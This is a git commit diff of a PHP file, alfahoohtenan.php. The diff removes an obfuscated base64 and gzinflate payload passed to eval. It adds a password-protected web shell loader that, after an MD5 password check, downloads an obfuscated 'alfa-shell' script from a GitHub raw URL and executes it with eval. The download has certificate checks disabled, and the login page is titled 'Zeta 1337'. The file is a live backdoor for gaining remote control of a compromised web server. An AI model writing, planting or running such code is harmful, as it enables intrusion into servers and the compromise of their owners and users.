a46637dd28402652ab76b7f3718ac1aea93ce49e
mangoleh098 <jatinainggolan119@gmail.com>
2025-07-02 00:05:56 +0700

    Update alfahoohtenan.php

--- alfahoohtenan.php
+++ alfahoohtenan.php
@@ -1,6 +1,82 @@
 <?php
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
-$Lix = "=AmkAzG1D3ykFs/3oGPr2mlryHx4BxMxhKx2r3R4QDdmIZQO/i1ejSrhg69+01/thCnb3PST8ulMoJezZg30FJhHj31/zms/NUQXeaFQsJDXBi4dKTgt1CeC23og+WgQaRMqv+OcwjEDTwzx/InKedDAcXhKNoArSpBj86aF3Ht+RyIRc1XiE/Hnos8r7Z/4uZjlnjj0XYSzWJ8Xw3mnqxUS6qP2hqSD0pD3hyCU0OMNk8lC1tAXQszrDpidu3sToJ8QaixkGMK2YcyMKnhQQiSlJokCtQxW4rFTbQtH5MN0SkIiG6bjEwaDo9ZNCEuJf5sH0/x29q/biskH5p5Mw0M4TCNnNtROe9fxpkHJkILBxmXxYUqTxVMJF3eJkSytb1dsACO9F9g8HwLFwMsaJHVhcin/QHwLBwJe+XcA6Eg/AHwPB4/uBQUA";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
+session_start();
+
+/**
+ * Disable error reporting
+ *
+ * Set this to error_reporting( -1 ) for debugging.
+ */
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+        // Set cookies using session if available
+        if (isset($_SESSION['SAP'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
+        }
+
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
+}
+
+// Function to check if the user is logged in
+function is_logged_in()
+{
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+// Check if the password is submitted and correct
+if (isset($_POST['password'])) {
+    $entered_password = $_POST['password'];
+    $hashed_password = '3d2a1d22aeb6dfd7320765e3ca9374d8'; // Replace this with your MD5 hashed password
+    if (md5($entered_password) === $hashed_password) {
+        // Password is correct, store it in session
+        $_SESSION['logged_in'] = true;
+        $_SESSION['SAP'] = 'janco'; // Replace this with your cookie data
+    } else {
+        // Password is incorrect
+        echo "Incorrect password. Please try again.";
+    }
+}
+
+// Check if the user is logged in before executing the content
+if (is_logged_in()) {
+    $a = geturlsinfo('https://raw.githubusercontent.com/nicxlau/alfa-shell/master/alfa-obfuscated.php');
+    eval('?>' . $a);
+} else {
+    // Display login form if not logged in
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Zeta 1337</title>
+    </head>
+    <body bgcolor="gray">
+        <center>
+        <img src="https://static.miraheze.org/hololivewiki/4/4e/Vestia_Zeta_-_Portrait_01.png" />
+        <body style="background-color:gray;">
+        <form method="POST" action="">
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password">
+            <input type="submit" value="Login!">
+        </form>
+        </center>
+    </body>
+    </html>
+    <?php
+}
 ?>
